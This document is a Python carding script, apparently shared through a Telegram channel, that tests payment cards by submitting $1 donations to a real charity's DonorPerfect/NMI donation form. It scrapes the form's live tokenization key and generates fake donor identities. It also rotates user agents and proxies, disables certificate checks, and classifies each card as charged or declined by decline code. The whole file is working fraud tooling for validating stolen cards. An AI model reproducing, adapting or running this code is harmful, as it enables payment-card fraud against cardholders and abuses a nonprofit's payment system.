"""
KRYX NMI 1$ CHARGE ENGINE
High-Performance NMI & DonorPerfect Payment Gateway Engine
Developer: @sweartx
Telegram Channel: t.me/KryxCheck
"""

import os
import re
import time
import uuid
import random
import threading
from datetime import datetime
from typing import Dict, Any, Tuple, Optional
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEVELOPER = "@sweartx"
TELEGRAM_CHANNEL = "t.me/KryxCheck"

GATEWAY_CONFIG = {
    'tokenization_key': '98AJnu-5CTm82-47pvVK-ePr2Nt',
    'org_id': 'eb1b9c87-fa91-4b36-b62b-778b6dd25bfb',
    'form_id': 'd80519dd-94d6-4839-a78f-aa6abd08414f',
    'form_name': 'Program Fee Payments',
    'form_version': 1739306579558,
    'org_name': 'BookSpring',
    'form_url': 'https://form-renderer-app.donorperfect.io/give/bookspring/program-fee-payments',
    'gateway_api_url': 'https://form-renderer-api.donorperfect.io/api/gateway/organization/',
    'charge_amount': '1',
    'currency': 'USD',
    'last_refresh': 0.0,
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
]

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Thomas", "Charles", "Daniel", "Emily", "Sarah", "Jessica", "Ashley"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Taylor", "Anderson", "Thomas", "Jackson"]

ADDRESSES = [
    {"address": "1420 5th Ave", "city": "Seattle", "state": "WA", "zip": "98101"},
    {"address": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
    {"address": "350 5th Ave", "city": "New York", "state": "NY", "zip": "10118"},
    {"address": "100 Universal City Plaza", "city": "Universal City", "state": "CA", "zip": "91608"},
    {"address": "200 E Colfax Ave", "city": "Denver", "state": "CO", "zip": "80203"},
    {"address": "1600 Amphitheatre Pkwy", "city": "Mountain View", "state": "CA", "zip": "94043"},
    {"address": "1200 S Congress Ave", "city": "Austin", "state": "TX", "zip": "78704"},
    {"address": "401 Biscayne Blvd", "city": "Miami", "state": "FL", "zip": "33132"}
]


def random_user_agent() -> str:
    return random.choice(USER_AGENTS)


def generate_identity() -> Dict[str, str]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    rand_num = random.randint(100, 9999)
    addr = random.choice(ADDRESSES)
    return {
        "first_name": first,
        "last_name": last,
        "full_name": f"{first} {last}",
        "email": f"{first.lower()}.{last.lower()}{rand_num}@gmail.com",
        "address": addr["address"],
        "city": addr["city"],
        "state": addr["state"],
        "zip": addr["zip"],
        "country": "US"
    }


def lookup_bin(card_number: str, proxy: Optional[str] = None) -> Tuple[Dict[str, Any], str]:
    """Lookup BIN details via pulse.pst.net API with fallback"""
    if not card_number:
        return {}, ""
    digits = re.sub(r"\D", "", card_number)
    bin_code = digits[:6]
    if len(bin_code) < 6:
        return {}, ""

    url = f"https://pulse.pst.net/api/bins/{bin_code}"
    headers = {
        "User-Agent": random_user_agent(),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": f"https://pulse.pst.net/bin/{bin_code}"
    }

    proxies = None
    if proxy and proxy.strip():
        proxies = {"http": proxy.strip(), "https": proxy.strip()}

    try:
        resp = requests.get(url, headers=headers, proxies=proxies, timeout=5)
        if resp.status_code == 200:
            data = resp.json().get("data", {})
            parts = [
                data.get("bin", ""),
                data.get("country_alpha3", ""),
                data.get("issuer_name", ""),
                data.get("card_level", ""),
                data.get("brand", ""),
                data.get("type", "")
            ]
            raw_str = " ".join([p.strip() for p in parts if p and str(p).strip()])
            return data, raw_str
    except Exception:
        pass

    return {}, ""


def parse_card(card_input: str) -> Optional[Tuple[Dict[str, str], str]]:
    """Robust card parser supporting |, :, /, and space delimiters"""
    if not isinstance(card_input, str) or not card_input.strip():
        return None

    cleaned = re.sub(r"[:/\s]+", "|", card_input.strip())
    parts = [p.strip() for p in cleaned.split("|") if p.strip()]
    if len(parts) < 4:
        return None

    card_number = re.sub(r"[^0-9]", "", parts[0])
    if len(card_number) < 12 or len(card_number) > 19:
        return None

    mm = re.sub(r"[^0-9]", "", parts[1]).zfill(2)
    yil_ham = re.sub(r"[^0-9]", "", parts[2])
    if len(yil_ham) == 4:
        yy = yil_ham[-2:]
        yy_full = yil_ham
    else:
        yy = yil_ham.zfill(2)
        yy_full = "20" + yy

    cvv = re.sub(r"[^0-9]", "", parts[3])
    if len(cvv) < 3 or len(cvv) > 4:
        return None

    card = {
        "number": card_number,
        "expiryMonth": mm,
        "expiryYear": yy_full,
        "expiryYearShort": yy,
        "cvv": cvv,
        "exp_formatted": f"{mm}{yy}"
    }
    card_display = f"{card_number}|{mm}|{yy}|{cvv}"
    return card, card_display


class NmiGatewayManager:
    """Thread-safe dynamic NMI gateway tokenization key and form parameter manager."""

    def __init__(self):
        self._lock = threading.Lock()
        self.config = dict(GATEWAY_CONFIG)
        self.refresh_interval = 300  # 5 minutes

    def refresh(self, proxy: Optional[str] = None) -> bool:
        proxies = {"http": proxy.strip(), "https": proxy.strip()} if proxy and proxy.strip() else None
        ua = random_user_agent()

        # Step 1: Attempt to refresh form metadata
        try:
            r = requests.get(
                self.config['form_url'],
                headers={'User-Agent': ua},
                proxies=proxies,
                timeout=12,
                verify=False
            )
            if r.status_code == 200:
                html = r.text
                org_match = re.search(r'"organizationId"\s*:\s*"([a-f0-9-]+)"', html)
                if org_match: self.config['org_id'] = org_match.group(1)
                form_id_match = re.search(r'"formId"\s*:\s*"([a-f0-9-]+)"', html)
                if form_id_match: self.config['form_id'] = form_id_match.group(1)
                form_name_match = re.search(r'"formName"\s*:\s*"([^"]+)"', html)
                if form_name_match: self.config['form_name'] = form_name_match.group(1)
                form_ver_match = re.search(r'"version"\s*:\s*(\d+)', html)
                if form_ver_match: self.config['form_version'] = int(form_ver_match.group(1))
                org_name_match = re.search(r'"organizationName"\s*:\s*"([^"]+)"', html)
                if org_name_match: self.config['org_name'] = org_name_match.group(1)
        except Exception:
            pass

        # Step 2: Fetch latest live NMI tokenization key from DonorPerfect API
        try:
            gw_url = f"{self.config['gateway_api_url']}{self.config['org_id']}"
            gw = requests.get(
                gw_url,
                headers={'User-Agent': ua, 'Accept': 'application/json'},
                proxies=proxies,
                timeout=12,
                verify=False
            )
            if gw.status_code == 200:
                gw_data = gw.json()
                new_key = gw_data.get('value', '') or gw_data.get('tokenizationKey', '')
                if new_key and isinstance(new_key, str) and len(new_key) > 5:
                    self.config['tokenization_key'] = new_key
        except Exception:
            pass

        self.config['last_refresh'] = time.time()
        return True

    def ensure_fresh(self, proxy: Optional[str] = None):
        if time.time() - self.config['last_refresh'] > self.refresh_interval:
            with self._lock:
                if time.time() - self.config['last_refresh'] > self.refresh_interval:
                    self.refresh(proxy=proxy)

    def get_tokenization_key(self) -> str:
        return self.config['tokenization_key']

    def get_config(self) -> Dict[str, Any]:
        return dict(self.config)


# Global Gateway Manager Instance
gateway_manager = NmiGatewayManager()


def _auto_refresh_loop():
    """Background worker periodically ensuring fresh gateway tokenization key."""
    time.sleep(10)
    while True:
        try:
            gateway_manager.refresh()
        except Exception:
            pass
        time.sleep(300)

threading.Thread(target=_auto_refresh_loop, daemon=True, name="nmi_gateway_auto_refresh").start()


def classify_error(msg: Any) -> Tuple[str, str, str]:
    """
    Categorizes gateway error messages into standard statuses and decline codes.
    Returns: (STATUS, DECLINE_CODE, CLEAN_MESSAGE)
    """
    msg_str = str(msg).strip()
    msg_lower = msg_str.lower()

    mapping = [
        ('insufficient', 'INSUFFICIENT_FUNDS', 'Insufficient funds'),
        ('balance', 'INSUFFICIENT_FUNDS', 'Insufficient funds / Low balance'),
        ('cvv', 'CVV_FAILURE', 'CVV / Security Code Mismatch'),
        ('cvc', 'CVV_FAILURE', 'CVC / Security Code Mismatch'),
        ('security code', 'CVV_FAILURE', 'Security Code Mismatch'),
        ('expired', 'EXPIRED_CARD', 'Expired Card'),
        ('invalid card', 'INVALID_CARD', 'Invalid Card Number'),
        ('invalid number', 'INVALID_CARD', 'Invalid Card Number'),
        ('do not honor', 'DO_NOT_HONOR', 'Do Not Honor'),
        ('fraud', 'SUSPECTED_FRAUD', 'Suspected Fraud'),
        ('stolen', 'LOST_OR_STOLEN', 'Lost or Stolen Card'),
        ('lost', 'LOST_OR_STOLEN', 'Lost or Stolen Card'),
        ('pickup', 'PICKUP_CARD', 'Pickup Card'),
        ('limit', 'EXCEED_LIMIT', 'Exceeds Withdrawal / Credit Limit'),
        ('exceed', 'EXCEED_LIMIT', 'Exceeds Limit'),
        ('not permitted', 'TRANSACTION_NOT_PERMITTED', 'Transaction Not Permitted to Cardholder'),
        ('closed', 'ACCOUNT_BLOCKED', 'Account Closed or Blocked'),
        ('blocked', 'ACCOUNT_BLOCKED', 'Account Blocked'),
        ('validation', 'VALIDATION_ERROR', 'Validation Error'),
        ('decline', 'DECLINED', 'Card Declined'),
        ('declined', 'DECLINED', 'Card Declined'),
    ]

    for pattern, code, default_desc in mapping:
        if pattern in msg_lower:
            return 'DECLINED', code, f"{code} - {msg_str}"

    return 'DECLINED', 'DECLINED', msg_str if msg_str else 'Card Declined'


def parse_submission_response(resp: requests.Response) -> Tuple[str, Optional[str], str]:
    """
    Parses DonorPerfect & NMI FormSubmission response.
    Returns: (STATUS, DECLINE_CODE, MESSAGE)
    """
    status_code = resp.status_code
    text = resp.text

    if status_code == 200:
        try:
            data = resp.json()
            if data.get('success') is True:
                conf = data.get('confirmationCode') or data.get('confirmation') or 'SUCCESS'
                return 'CHARGED', None, f"Donation succeeded | Confirmation: {conf}"
            elif data.get('failure') is True or data.get('success') is False:
                err_obj = data.get('error', {})
                if isinstance(err_obj, dict):
                    details = err_obj.get('details', {})
                    if isinstance(details, dict) and details:
                        detail_msgs = list(details.values())
                        if detail_msgs:
                            return classify_error(detail_msgs[0])
                    err_msg = err_obj.get('message', '')
                    if err_msg:
                        return classify_error(err_msg)
                    return classify_error(str(err_obj))
                return classify_error(str(err_obj))
            elif 'confirmation' in str(data).lower():
                conf = data.get('confirmationCode', data.get('confirmation', 'N/A'))
                return 'CHARGED', None, f"Donation succeeded | Confirmation: {conf}"
            else:
                return 'CHARGED', None, f"Charged | {text[:120]}"
        except Exception:
            if 'thank' in text.lower() or 'success' in text.lower():
                return 'CHARGED', None, "Donation succeeded"
            return 'DECLINED', 'UNEXPECTED_200', f"Response 200 | {text[:140]}"

    elif status_code == 400:
        try:
            data = resp.json()
            errors = data.get('errors', [])
            if isinstance(errors, list) and errors:
                err_msg = errors[0] if isinstance(errors[0], str) else str(errors[0])
            elif isinstance(data.get('message'), str):
                err_msg = data['message']
            elif isinstance(data.get('title'), str):
                err_msg = data['title']
            else:
                err_msg = str(data)[:140]
            return classify_error(err_msg)
        except Exception:
            return 'DECLINED', 'HTTP_400', f"Error 400: {text[:140]}"

    elif status_code == 422:
        try:
            data = resp.json()
            errors = data.get('errors', data.get('validationErrors', []))
            if isinstance(errors, dict):
                all_errs = []
                for k, v in errors.items():
                    if isinstance(v, list): all_errs.extend(v)
                    else: all_errs.append(str(v))
                err_msg = '; '.join(all_errs) if all_errs else str(data)[:140]
            elif isinstance(errors, list) and errors:
                err_msg = errors[0] if isinstance(errors[0], str) else str(errors[0])
            else:
                err_msg = str(data)[:140]
            return classify_error(err_msg)
        except Exception:
            return 'DECLINED', 'VALIDATION_ERROR', f"Validation Error 422: {text[:140]}"

    else:
        return 'ERROR', f'HTTP_{status_code}', f"HTTP {status_code} | {text[:140]}"


class NmiChargeProcessor:
    """Encapsulates the 8-step NMI card tokenization and DonorPerfect donation submission."""

    def __init__(self, card: Dict[str, str], identity: Dict[str, str], proxy: Optional[str] = None):
        self.card = card
        self.identity = identity
        self.proxy = proxy.strip() if proxy and proxy.strip() else None
        self.cart_id = str(uuid.uuid4())
        self.user_agent = random_user_agent()

        self.session = requests.Session()
        if self.proxy:
            self.session.proxies = {
                "http": self.proxy,
                "https": self.proxy
            }

    def run(self) -> Dict[str, Any]:
        start_time = time.time()
        result = {
            "success": False,
            "status": "DECLINED",
            "message": "Transaction declined",
            "decline_code": None,
            "amount": "1.00 USD",
            "token_id": None,
            "card_info": {},
            "time_taken": "0.00s"
        }

        try:
            gateway_manager.ensure_fresh(proxy=self.proxy)
            cfg = gateway_manager.get_config()
            tok_key = cfg['tokenization_key']

            nmi_form_headers = {
                'User-Agent': self.user_agent,
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://secure.nmi.com',
                'Referer': 'https://secure.nmi.com/',
            }

            # [STEP 1] Create NMI Token
            create_resp = self.session.post(
                'https://secure.nmi.com/token/api/create',
                headers=nmi_form_headers,
                data=f'tokenizationKey={tok_key}&cartCorrelationId={self.cart_id}',
                timeout=15,
                verify=False
            )
            try:
                create_data = create_resp.json()
            except Exception:
                result["status"] = "ERROR"
                result["message"] = "Invalid response during token creation."
                result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
                return result

            token_id = create_data.get('token', '')
            if not token_id:
                result["status"] = "ERROR"
                result["message"] = "Failed to obtain token from NMI gateway."
                result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
                return result

            result["token_id"] = token_id

            nmi_json_headers = {
                'User-Agent': self.user_agent,
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Origin': 'https://secure.nmi.com',
                'Referer': 'https://secure.nmi.com/',
            }

            # [STEP 2, 3, 4] Save Multipart Token (Card Number, Expiry, CVV)
            multipart_payload = {
                'tokenizationKey': tok_key,
                'cartCorrelationId': self.cart_id,
                'tokenId': token_id,
                'data': [
                    {'elementId': 'ccnumber', 'value': self.card["number"]},
                    {'elementId': 'ccexp', 'value': self.card["exp_formatted"]},
                    {'elementId': 'cvv', 'value': self.card["cvv"]}
                ]
            }

            save_resp = self.session.post(
                'https://secure.nmi.com/token/api/save_multipart_token',
                headers=nmi_json_headers,
                json=multipart_payload,
                timeout=15,
                verify=False
            )

            # [STEP 5] Token Lookup & Card Verification
            lookup_resp = self.session.post(
                'https://secure.nmi.com/token/api/lookup',
                headers=nmi_json_headers,
                json={'tokenizationKey': tok_key, 'cartCorrelationId': self.cart_id, 'tokenId': token_id},
                timeout=15,
                verify=False
            )
            try:
                lookup_data = lookup_resp.json()
            except Exception:
                result["status"] = "ERROR"
                result["message"] = "Token lookup failed."
                result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
                return result

            card_info = lookup_data.get('card', {})
            result["card_info"] = card_info
            if not card_info.get('number'):
                result["status"] = "DECLINED"
                result["decline_code"] = "INVALID_CARD"
                result["message"] = "Token verification failed / Invalid card."
                result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
                return result

            # [STEP 6] Build DonorPerfect $1 Submission Payload
            now_str = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
            submission_payload = {
                'meta-data': {
                    'formId': cfg['form_id'],
                    'formVersion': cfg['form_version'],
                    'formName': cfg['form_name'],
                    'localDateTime': now_str,
                    'hiddenFields': [],
                    'organizationName': cfg['org_name'],
                    'organizationId': cfg['org_id'],
                },
                'data': {
                    'gift_amount': cfg['charge_amount'],
                    'gift_type': 'oneTime',
                    'first_name': self.identity['first_name'],
                    'last_name': self.identity['last_name'],
                    'email': self.identity['email'],
                    'address': self.identity['address'],
                    'city': self.identity['city'],
                    'state': self.identity['state'],
                    'zip': self.identity['zip'],
                    'country': self.identity['country'],
                    'phone': '',
                    'employer': '',
                    'payment_method': 'credit_card',
                },
                'payment-data': {
                    'card': card_info,
                    'token': token_id,
                    'cartCorrelationId': self.cart_id,
                    'check': lookup_data.get('check', {}),
                },
                'paypal-data': {},
            }

            # [STEP 7] Submit 1$ Charge via FormSubmission
            submit_headers = {
                'User-Agent': self.user_agent,
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'Origin': 'https://form-renderer-app.donorperfect.io',
                'Referer': 'https://form-renderer-app.donorperfect.io/',
            }

            submit_resp = self.session.post(
                'https://form-renderer-api.donorperfect.io/api/FormSubmission',
                headers=submit_headers,
                json=submission_payload,
                timeout=30,
                verify=False
            )

            # [STEP 8] Process Result
            status, decline_code, message = parse_submission_response(submit_resp)
            result["status"] = status
            result["decline_code"] = decline_code
            result["message"] = message
            result["success"] = (status == "CHARGED")

        except requests.exceptions.Timeout:
            result["status"] = "ERROR"
            result["message"] = "Gateway request timed out."
            result["decline_code"] = "TIMEOUT"
        except Exception as e:
            result["status"] = "ERROR"
            result["message"] = f"Processor exception: {str(e)[:140]}"
            result["decline_code"] = "EXCEPTION"

        result["time_taken"] = f"{round(time.time() - start_time, 2):.2f}s"
        return result


def check_card(card_str: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    """
    Main entry point for checking a card through NMI 1$ Charge Gateway.
    """
    if not card_str or not card_str.strip():
        return {
            "status": "ERROR",
            "message": "Card parameter is required. Format: CARD|MM|YY|CVV",
            "card": None,
            "decline_code": "EMPTY_INPUT",
            "amount": "1.00 USD",
            "raw_bin": None,
            "bin_data": {},
            "time_taken": "0.00s",
            "developer": DEVELOPER,
            "channel": TELEGRAM_CHANNEL
        }

    parsed = parse_card(card_str)
    if not parsed:
        return {
            "status": "ERROR",
            "message": "Invalid card format. Expected: CARD|MM|YY|CVV",
            "card": card_str.strip()[:35],
            "decline_code": "INVALID_FORMAT",
            "amount": "1.00 USD",
            "raw_bin": None,
            "bin_data": {},
            "time_taken": "0.00s",
            "developer": DEVELOPER,
            "channel": TELEGRAM_CHANNEL
        }

    card_obj, card_display = parsed
    bin_data, bin_str = lookup_bin(card_obj["number"], proxy=proxy)
    identity = generate_identity()

    processor = NmiChargeProcessor(card_obj, identity, proxy=proxy)
    res = processor.run()

    # Merge BIN data if pulse.pst.net was empty but NMI lookup provided details
    card_info = res.get("card_info", {})
    if not bin_data and card_info:
        bin_data = {
            "bin": card_info.get("bin", ""),
            "brand": (card_info.get("type", "") or "").upper(),
            "type": (card_info.get("category", "") or "").upper(),
            "card_level": "",
            "issuer_name": "NMI Verified",
            "country_alpha3": "US"
        }
        if not bin_str:
            bin_str = f"{bin_data['bin']} {bin_data['brand']} {bin_data['type']}".strip()

    return {
        "status": res["status"],
        "message": res["message"],
        "card": card_display,
        "decline_code": res["decline_code"],
        "amount": res["amount"],
        "raw_bin": bin_str or None,
        "bin_data": bin_data,
        "token_id": res.get("token_id"),
        "gateway": "NMI (DonorPerfect - BookSpring $1)",
        "time_taken": res["time_taken"],
        "developer": DEVELOPER,
        "channel": TELEGRAM_CHANNEL
    }
